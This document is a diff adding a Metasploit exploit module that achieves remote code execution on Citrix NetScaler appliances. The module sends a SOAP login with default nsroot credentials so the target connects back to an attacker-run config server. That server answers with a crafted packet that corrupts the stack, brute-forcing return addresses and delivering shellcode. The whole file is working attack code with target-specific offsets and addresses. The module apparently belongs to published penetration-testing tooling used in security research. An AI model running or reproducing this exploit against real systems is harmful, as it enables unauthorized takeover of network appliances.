@@ -1,0 +1,167 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::TcpServer
+  include Msf::Exploit::Brute
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Citrix NetScaler SOAP Handler Remote Code Execution",
+      'Description'    => %q{
+        This module exploits a memory corruption vulnerability on the Citrix NetScaler Appliance.
+        The vulnerability exists in the SOAP handler, accessible through the web interface. A
+        malicious SOAP requests can force the handler to connect to a malicious NetScaler config
+        server. This malicious config server can send a specially crafted response in order to
+        trigger a memory corruption and overwrite data in the stack, to finally execute arbitrary
+        code with the privileges of the web server running the SOAP handler. This module has been
+        tested successfully on the NetScaler Virtual Appliance 450010.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Bradley Austin', # Vulnerability Discovery and PoC
+          'juan vazquez' # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['URL', 'http://console-cowboys.blogspot.com/2014/09/scaling-netscaler.html']
+        ],
+      'Payload'        =>
+        {
+          'Space'          => 1024,
+          'MinNops'        => 512,
+          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
+        },
+      'Arch'           => ARCH_X86,
+      'Platform'       => 'bsd',
+      'Stance'         => Msf::Exploit::Stance::Aggressive,
+      'Targets'        =>
+        [
+          [ 'NetScaler Virtual Appliance 450010',
+            {
+              'RwPtr'        => 0x80b9000, # apache2 rw address / Since this target is a virtual appliance, has sense.
+              'Offset'       => 606,
+              'Ret'          => 0xffffda94, # Try before bruteforce...
+              # The virtual appliance lacks of security mitigations like DEP/ASLR, since the
+              # process being exploited is an apache child, the bruteforce attack works fine
+              # here.
+              'Bruteforce'   =>
+                {
+                  'Start' => { 'Ret' => 0xffffec00 }, # bottom of the stack
+                  'Stop'  => { 'Ret' => 0xfffdf000 }, # top of the stack
+                  'Step'  => 256
+                }
+            }
+          ],
+        ],
+      'DisclosureDate' => "Sep 22 2014",
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path to the soap handler', '/soap']),
+        OptAddress.new('SRVHOST', [true, "The local host to listen on. This must be an address on the local machine reachable by the target", ]),
+        OptPort.new('SRVPORT', [true,  "The local port to listen on.", 3010])
+      ], self.class)
+  end
+
+
+  def check
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path)
+    })
+
+    if res && res.code == 200 && res.body && res.body =~ /Server Request Handler.*No body received/m
+      return Exploit::CheckCode::Detected
+    end
+
+    Exploit::CheckCode::Unknown
+  end
+
+  def exploit
+    if ['0.0.0.0', '127.0.0.1'].include?(datastore['SRVHOST'])
+      fail_with(Failure::BadConfig, 'Bad SRVHOST, use an address on the local machine reachable by the target')
+    end
+
+    if check != Exploit::CheckCode::Detected
+      fail_with(Failure::NoTarget, "#{peer} - SOAP endpoint not found")
+    end
+
+    start_service
+
+    if target.ret
+      @curr_ret = target.ret
+      send_request_soap
+      Rex.sleep(3)
+
+      if session_created?
+        return
+      end
+    end
+
+    super
+  end
+
+  def brute_exploit(addrs)
+    @curr_ret = addrs['Ret']
+    send_request_soap
+  end
+
+  def send_request_soap
+    soap = <<-EOS
+<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
+<SOAP-ENV:Body>
+<ns7744:login xmlns:ns7744="urn:NSConfig">
+<username xsi:type="xsd:string">nsroot</username>
+<password xsi:type="xsd:string">nsroot</password>
+<clientip xsi:type="xsd:string">#{datastore['SRVHOST']}</clientip>
+<cookieTimeout xsi:type="xsd:int">1800</cookieTimeout>
+<ns xsi:type="xsd:string">#{datastore['SRVHOST']}</ns>
+</ns7744:login>
+</SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
+    EOS
+
+    print_status("#{peer} - Sending soap request...")
+
+    send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path),
+      'data'   => soap
+    }, 1)
+  end
+
+  def on_client_data(c)
+    print_status("#{c.peerhost} - Getting request...")
+
+    data = c.get_once(2)
+    req_length = data.unpack("v")[0]
+
+    req_data = c.get_once(req_length - 2)
+    unless req_data.unpack("V")[0] == 0xa5a50000
+      print_error("#{c.peerhost} - Incorrect request... sending payload anyway")
+    end
+
+    print_status("#{c.peerhost} - Sending #{payload.encoded.length} bytes payload with ret 0x#{@curr_ret.to_s(16)}...")
+
+    my_payload = Rex::Text.pattern_create(target['Offset'])
+    my_payload << [@curr_ret, target['RwPtr']].pack("V*")
+    my_payload << payload.encoded
+
+    pkt = [my_payload.length + 6].pack("v")
+    pkt << "\x00\x00\xa5\xa5"
+    pkt << my_payload
+    c.put(pkt)
+    c.disconnect
+  end
+
+end
